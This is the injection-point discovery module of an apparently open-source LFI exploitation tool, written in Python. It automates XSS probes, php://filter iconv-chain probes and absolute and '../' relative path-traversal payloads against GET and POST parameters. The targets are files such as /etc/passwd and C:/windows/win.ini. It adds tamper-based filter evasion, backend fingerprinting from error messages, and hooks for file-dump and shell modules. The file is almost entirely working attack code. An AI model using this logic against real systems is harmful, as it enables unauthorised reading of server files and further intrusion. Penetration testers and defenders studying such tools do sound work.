# BTteaLFI
# Copyright (C) 2024-2025 BTtea
#
# This file is licensed under GPLv2. See LICENSE.txt for details.

import importlib
from copy import deepcopy
from lib.utils.my_functions import MsgEvent,AskQuestion,HTTP_code_status
from lib.http.request_packet import test_connectivity
from lib.detect.detection import DetectBackendApplication,CatchErrorMessage
from lib.exploits.php_wrapper import iconv_lfi

def find_skip_test(prompt_message:str,_skip_prompt:list) -> bool:
    for current_skip in _skip_prompt:
        if current_skip in prompt_message:
            return True
    return False


def tamper_pipe_line(tampers:list,payload:str) -> str:
    if tampers:
        for tamper in tampers:
            bypass = importlib.import_module(f"tamper.{tamper}")
            payload=bypass.tamper(payload)
    return payload


def combine_current_injection(mark:str,index:int,parts:list):
    test_case = "".join(
        parts[j] + (mark if j == index else "")
        for j in range(len(parts))
    )
    return test_case


def update_request_payload(target,HTTP_method,payload):
    if HTTP_method=='POST':
        target.parameters.post.post_query=payload
    if HTTP_method=='GET':
        target.parameters.url.url=payload
        target.parameters.url.RenewURL()
    return target


def find_injection_points(target,HTTP_method):
    from os import listdir
    from json import load
    from lib.utils.my_functions import RandomString

    if HTTP_method=='POST':
        parts = target.parameters.post.post_query.split("*")
    if HTTP_method=='GET':
        parts = target.parameters.url.url.split("*")


    find_payloads={
        "app_type"   : "",
        "os_version" : "",
        "os_type"    : "",
        "os_banner"  : "",
        "app_banner" : "",
        "technique"  : []
    }
    for currnet_injec_index in range(len(parts)-1):
        run_only_once=True
        for current_file in listdir('./data/payloads/'):

            if target.args.os != 'all' and target.args.os != current_file.split('.')[0]:
                continue
            
            with open(f'./data/payloads/{current_file}', 'r', encoding='utf-8') as file:
                payloads_data=load(file)

            tmp_target=deepcopy(target)

            if run_only_once:
                print(MsgEvent(target.debug_level(),'INFO',f"testing {HTTP_method} parameter '#{currnet_injec_index+1}*'"),end='')

            # testing XSS
            if not bool(target.args.skip_xss) and run_only_once:
                run_only_once=False
                xss_test=f"'{RandomString()}<'\">{RandomString()}"

                xss_test=tamper_pipe_line(tmp_target.tampers(),xss_test)
                test_case=combine_current_injection(xss_test,currnet_injec_index,parts)
                tmp_target=update_request_payload(tmp_target,HTTP_method,test_case)

                print(MsgEvent(target.debug_level(),'PAYLOAD',test_case),end='')

                res_content=test_connectivity(tmp_target)
                
                if res_content=='Q' or res_content=='':
                    return

                if res_content:
                    if res_content.status_code!=200:
                        print(MsgEvent(target.debug_level(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                    if xss_test in res_content.body:
                        print(MsgEvent(target.debug_level(),'INFO',f"heuristic (XSS) test shows that {HTTP_method} parameter '#{currnet_injec_index+1}*' might be vulnerable to cross-site scripting (XSS) attacks",BoldFlag=True),end='')

                    _errmsg=CatchErrorMessage(res_content.body)
                    if  _errmsg:
                        result=DetectBackendApplication(_errmsg)

                        if result:
                            print(MsgEvent(target.debug_level(),'DEBUG',f"Captured backend physical path from the error message: '{result[2][0]}'."),end='')
                            print(MsgEvent(target.debug_level(),'INFO',f"An error message was captured, which disclosed backend technologies: the operating system is '{result[0].capitalize()}' and the backend technology is '{result[1][1:].upper()}'.",BoldFlag=True),end='')

                            if not bool(find_payloads['app_type']):
                                find_payloads['app_type']=result[1][1:].upper()

                            if target.args.os == 'all':
                                question = f"Based on the captured error message, the detected operating system is '{result[0].capitalize()}'. Do you want to skip payload testing for other operating systems? [Y/n] "
                                _choices = ['Y','n']
                                default  = 'Y'
                                res=AskQuestion(question,_choices,default,target)
                                if res=='Y':
                                    target.args.os=result[0]
                                    tmp_target.args.os=result[0]
                                    find_payloads["os_banner"]=result[0].capitalize()
                                    find_payloads["os_type"]=result[0].capitalize()

                if target.args.os != 'all' and target.args.os != current_file.split('.')[0]:
                    break

            # testing php://filter
            if 'PHP_F' in target.technique:
                if target.args.os == 'windows' and target.args.php_wrapper == '/etc/passwd':
                    tmp_target.args.php_wrapper='C:/windows/win.ini'
                elif target.args.os == 'all':
                    if current_file.split('.')[0] == 'windows' and target.args.php_wrapper == '/etc/passwd':
                        tmp_target.args.php_wrapper='C:/windows/win.ini'

                _current_prompt_message=f"testing 'php://filter' access to the file '{tmp_target.args.php_wrapper}'"
                res_skip=find_skip_test(_current_prompt_message,target.test_skip)
                if res_skip:
                    print(MsgEvent(target.debug_level(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                else:
                    print(MsgEvent(target.debug_level(),'INFO',_current_prompt_message),end='')
                    iconv_lfi_string=RandomString()
                    php_filter_test=iconv_lfi(iconv_lfi_string)+tmp_target.args.php_wrapper
                    if 'php-cgi/php-cgi.exe?%AD' in target.parameters.url.url:
                        php_filter_test=f"%22{php_filter_test}%22"
                    php_filter_test=tmp_target.args.prefix + php_filter_test + tmp_target.args.suffix

                    php_filter_test=tamper_pipe_line(tmp_target.tampers(),php_filter_test)
                    test_case=combine_current_injection(php_filter_test,currnet_injec_index,parts)
                    tmp_target=update_request_payload(tmp_target,HTTP_method,test_case)

                    print(MsgEvent(target.debug_level(),'PAYLOAD',test_case),end='')

                    res_content=test_connectivity(tmp_target)
                
                    if res_content=='Q' or res_content=='':
                        return
                    

                    if res_content.status_code!=200:
                        print(MsgEvent(target.debug_level(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                    if iconv_lfi_string in res_content.body:
                        print(MsgEvent(target.debug_level(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support 'php://filter' injection, allowing access to the '{tmp_target.args.php_wrapper}' file.",BoldFlag=True),end='')

                        if target.args.backend_app == 'all':
                            target.args.backend_app='php'
                            tmp_target.args.backend_app='php'
                            print(MsgEvent(target.debug_level(),'INFO',f"Detected that the backend application is likely 'PHP'. Switching payloads to PHP.",BoldFlag=True),end='')
                            find_payloads['app_type']='PHP'

                        find_payloads['technique'].append(
                            {
                                'HTTP_method':HTTP_method,
                                'Parameter_Name':f'#{currnet_injec_index+1}*',
                                'Type':'php://filter wrapper',
                                'Payload':f"php://filter/convert.base64-encode/resource={target.args.php_wrapper}",
                                'move':0
                            }
                        )


            for injection_path_type,path_type_data in payloads_data.items():
                
                tmp_target=deepcopy(target)
                injection_path_type_flag=False

                for backend_app_type,backend_tech_data in payloads_data[injection_path_type].items():
                    if target.args.backend_app != 'all' and backend_app_type not in ['all',target.args.backend_app]:
                        continue
                    backend_tech=payloads_data[injection_path_type][backend_app_type]

                    # /etc/php/{0}/fpm/php.ini 有版本路徑
                    if backend_tech['version']:
                        for ver in backend_tech['version']:
                            _current_skip_continue=False
                            # ['php', '<=', '5']
                            if target.test_skip:
                                # version skip test
                                for current_skip in target.test_skip:
                                    
                                    if len(current_skip.split())==3:
                                        # 如果不符合條件則跳過
                                        _skip=current_skip.split()
                                        try:
                                            if _skip[0] not in ["all","php","asp","aspx","jsp"] or _skip[1] not in ['>','>=','<','<=','==','!=']:
                                                continue
                                            float(current_skip.split()[2])
                                        except:
                                            continue
                                        # 符合條件則嘗試
                                        try:
                                            if _skip[0] == backend_app_type:
                                                if _skip[1] == '>' and float(ver) > float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '>=' and float(ver) >= float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '<' and float(ver) < float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '<=' and float(ver) <= float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '==' and float(ver) == float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '!=' and float(ver) != float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                        except:
                                            pass
                                

                            for p in backend_tech['data']:
                                _current_prompt_message=f"testing {p['message'].format(ver)}"

                                # level test
                                if p['level']>tmp_target.args.level:
                                    continue


                                if _current_skip_continue:
                                    print(MsgEvent(target.debug_level(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                    continue

                                # 絕對路徑測試
                                if injection_path_type == 'absolute_path' and 'AP' in target.technique:
                                    
                                    
                                    res_skip=find_skip_test(_current_prompt_message,target.test_skip)
                                    if res_skip:
                                        print(MsgEvent(target.debug_level(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                        continue

                                    print(MsgEvent(target.debug_level(),'INFO',_current_prompt_message),end='')
                                    current_payload=tmp_target.args.prefix + p['path'].format(ver) + tmp_target.args.suffix
                                    
                                    current_payload=tamper_pipe_line(tmp_target.tampers(),current_payload)
                                    test_case=combine_current_injection(current_payload,currnet_injec_index,parts)
                                    tmp_target=update_request_payload(tmp_target,HTTP_method,test_case)

                                    print(MsgEvent(target.debug_level(),'PAYLOAD',test_case),end='')
                                    
                                    res_content=test_connectivity(tmp_target)
                                    
                                    if res_content=='Q' or res_content=='':
                                        return
                                    
                                    
                                    if res_content.status_code!=200:
                                        print(MsgEvent(target.debug_level(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')
                                    
                                    if p['content'] in res_content.body:
                                        injection_path_type_flag=True
                                        
                                        print(MsgEvent(target.debug_level(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support {injection_path_type.replace('_',' ')} injection, allowing access to the '{p['path'].format(ver)}' file.",BoldFlag=True),end='')

                                        if target.args.os == 'all':
                                            DetectedOS=current_file.split('.')[0].capitalize()
                                            print(MsgEvent(target.debug_level(),'INFO',f"Detected that the backend system is likely '{DetectedOS}'. Switching payloads to {DetectedOS}.",BoldFlag=True),end='')
                                            target.args.os=current_file.split('.')[0]
                                            find_payloads['os_type']=target.args.os
                                        
                                        find_payloads['technique'].append(
                                            {
                                                'HTTP_method':HTTP_method,
                                                'Parameter_Name':f'#{currnet_injec_index+1}*',
                                                'Type':injection_path_type.replace('_',' '),
                                                'Payload':current_payload,
                                                'move':0
                                            }
                                        )

                                        break
                                # 相對路徑測試
                                elif injection_path_type == 'relative_path' and 'RP' in target.technique:
                                    
                                    _current_prompt_message=f"testing {p['message'].replace('absolute path','relative path').format(ver)}"
                                    res_skip=find_skip_test(_current_prompt_message,target.test_skip)
                                    if res_skip:
                                        print(MsgEvent(target.debug_level(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                        continue

                                    move_path='../'
                                    print(MsgEvent(target.debug_level(),'INFO',_current_prompt_message),end='')
                                    if target.args.path_depth:
                                        target.args.move=target.args.path_depth
                                    for move in range(target.args.path_depth,target.args.move+1):
                                        if move == 0:
                                            continue
                                        current_payload=tmp_target.args.prefix + move_path*(move) + p['path'].format(ver) + tmp_target.args.suffix
                                        
                                        current_payload=tamper_pipe_line(tmp_target.tampers(),current_payload)
                                        test_case=combine_current_injection(current_payload,currnet_injec_index,parts)
                                        tmp_target=update_request_payload(tmp_target,HTTP_method,test_case)

                                        print(MsgEvent(target.debug_level(),'PAYLOAD',test_case),end='')

                                        res_content=test_connectivity(tmp_target)
                                        
                                        if res_content=='Q' or res_content=='':
                                            return

                                        if res_content.status_code!=200:
                                            print(MsgEvent(target.debug_level(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                                        if p['content'] in res_content.body:
                                            injection_path_type_flag=True
                                                                                        
                                            print(MsgEvent(target.debug_level(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support {injection_path_type.replace('_',' ')} injection, allowing access to the '{move_path*(move)}{p['path'].format(ver)}' file.",BoldFlag=True),end='')

                                            if target.args.os == 'all':
                                                DetectedOS=current_file.split('.')[0].capitalize()
                                                print(MsgEvent(target.debug_level(),'INFO',f"Detected that the backend system is likely '{DetectedOS}'. Switching payloads to {DetectedOS}.",BoldFlag=True),end='')
                                                target.args.os=current_file.split('.')[0]
                                                find_payloads['os_type']=target.args.os
                                            
                                            find_payloads['technique'].append(
                                                {
                                                    'HTTP_method':HTTP_method,
                                                    'Parameter_Name':f'#{currnet_injec_index+1}*',
                                                    'Type':injection_path_type.replace('_',' '),
                                                    'Payload':current_payload,
                                                    'move':move
                                                }
                                            )

                                            break

                                
                                
                                if injection_path_type_flag:
                                    break
                            if injection_path_type_flag:
                                break
                        if injection_path_type_flag:
                            break

                    # /etc/hosts 無版本路徑
                    else:
                        for p in backend_tech['data']:
                            # level test
                            if p['level']>tmp_target.args.level:
                                continue
                                
                            # 絕對路徑測試
                            if injection_path_type == 'absolute_path' and 'AP' in target.technique:
                                
                                _current_prompt_message=f"testing {p['message']}"
                                res_skip=find_skip_test(_current_prompt_message,target.test_skip)
                                if res_skip:
                                    print(MsgEvent(target.debug_level(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                    continue
                                

                                print(MsgEvent(target.debug_level(),'INFO',_current_prompt_message),end='')
                                current_payload=tmp_target.args.prefix + p['path'] + tmp_target.args.suffix
                                
                                current_payload=tamper_pipe_line(tmp_target.tampers(),current_payload)
                                test_case=combine_current_injection(current_payload,currnet_injec_index,parts)
                                tmp_target=update_request_payload(tmp_target,HTTP_method,test_case)

                                print(MsgEvent(target.debug_level(),'PAYLOAD',test_case),end='')

                                res_content=test_connectivity(tmp_target)
                                
                                if res_content=='Q' or res_content=='':
                                    return

                                if res_content.status_code!=200:
                                    print(MsgEvent(target.debug_level(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                                if p['content'] in res_content.body:

                                    injection_path_type_flag=True
                                    
                                    print(MsgEvent(target.debug_level(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support {injection_path_type.replace('_',' ')} injection, allowing access to the '{p['path']}' file.",BoldFlag=True),end='')

                                    if target.args.os == 'all':
                                        DetectedOS=current_file.split('.')[0].capitalize()
                                        print(MsgEvent(target.debug_level(),'INFO',f"Detected that the backend system is likely '{DetectedOS}'. Switching payloads to {DetectedOS}.",BoldFlag=True),end='')
                                        target.args.os=current_file.split('.')[0]
                                        find_payloads['os_type']=target.args.os

                                    find_payloads['technique'].append(
                                        {
                                            'HTTP_method':HTTP_method,
                                            'Parameter_Name':f'#{currnet_injec_index+1}*',
                                            'Type':injection_path_type.replace('_',' '),
                                            'Payload':current_payload,
                                            'move':0
                                        }
                                    )

                                    break
                            # 相對路徑測試
                            elif injection_path_type == 'relative_path' and 'RP' in target.technique:

                                _current_prompt_message=f"testing {p['message'].replace('absolute path','relative path')}"
                                res_skip=find_skip_test(_current_prompt_message,target.test_skip)
                                if res_skip:
                                    print(MsgEvent(target.debug_level(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                    continue


                                move_path='../'
                                print(MsgEvent(target.debug_level(),'INFO',_current_prompt_message),end='')
                                if target.args.path_depth:
                                    target.args.move=target.args.path_depth
                                for move in range(target.args.path_depth,target.args.move+1):
                                    if move == 0:
                                        continue
                                    current_payload=tmp_target.args.prefix + move_path*(move) + p['path'] + tmp_target.args.suffix
                                    
                                    current_payload=tamper_pipe_line(tmp_target.tampers(),current_payload)
                                    test_case=combine_current_injection(current_payload,currnet_injec_index,parts)
                                    tmp_target=update_request_payload(tmp_target,HTTP_method,test_case)

                                    print(MsgEvent(target.debug_level(),'PAYLOAD',test_case),end='')

                                    res_content=test_connectivity(tmp_target)
                                    
                                    if res_content=='Q' or res_content=='':
                                        return

                                    if res_content.status_code!=200:
                                        print(MsgEvent(target.debug_level(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                                    if p['content'] in res_content.body:
                                        injection_path_type_flag=True
                                        
                                        print(MsgEvent(target.debug_level(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support {injection_path_type.replace('_',' ')} injection, allowing access to the '{move_path*(move)}{p['path']}' file.",BoldFlag=True),end='')

                                        if target.args.os == 'all':
                                            DetectedOS=current_file.split('.')[0].capitalize()
                                            print(MsgEvent(target.debug_level(),'INFO',f"Detected that the backend system is likely '{DetectedOS}'. Switching payloads to {DetectedOS}.",BoldFlag=True),end='')
                                            target.args.os=current_file.split('.')[0]
                                            find_payloads['os_type']=target.args.os

                                        find_payloads['technique'].append(
                                            {
                                                'HTTP_method':HTTP_method,
                                                'Parameter_Name':f'#{currnet_injec_index+1}*',
                                                'Type':injection_path_type.replace('_',' '),
                                                'Payload':current_payload,
                                                'move':move
                                            }
                                        )

                                        break

                            if injection_path_type_flag:
                                break
                        if injection_path_type_flag:
                            break
                    if injection_path_type_flag:
                        break
        if bool(find_payloads['technique'])==False:
            print(MsgEvent(target.debug_level(),'WARNING',f"(custom) {HTTP_method} parameter '#{currnet_injec_index+1}*' does not seem to be injectable"),end='')
        else:
            break
    return find_payloads



def loading_attack_module(target):

    # if is *
    if '*' in target.parameters.post.post_query:
        result=find_injection_points(target,'POST')
        if result and result['technique']:
            return result


    if '*' in target.parameters.url.get_query:
        result=find_injection_points(target,'GET')
        if result and result['technique']:
            return result
    
    return


def loading_dump_file_module(target,poc):
    from lib.exploits.lfi_shell import find_exploit_points
    # if is *
    if '*' in target.parameters.post.post_query or '*' in target.parameters.url.url:
        find_exploit_points(target,poc)

    return


def find_rce_points(target,poc):
    pass


def loading_get_shell_module(target,poc):

    # if is *
    if '*' in target.parameters.post.post_query or '*' in target.parameters.url.url:
        result=find_rce_points(target,poc)
    
    return
